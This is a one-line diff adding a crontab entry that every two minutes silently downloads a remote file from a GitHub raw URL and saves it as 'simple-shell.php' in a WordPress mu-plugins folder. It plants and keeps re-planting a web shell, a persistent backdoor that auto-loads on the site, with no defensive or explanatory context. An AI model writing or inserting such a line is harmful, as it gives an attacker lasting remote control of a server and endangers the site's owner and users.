@@ -1,0 +1,1 @@
+*/2 * * * * /usr/bin/wget -O /home/chiacundippal/public_html/web/wp-content/mu-plugins/simple-shell.php https://raw.githubusercontent.com/freyarion25/ngehek/refs/heads/main/memek.txt >/dev/null 2>&1
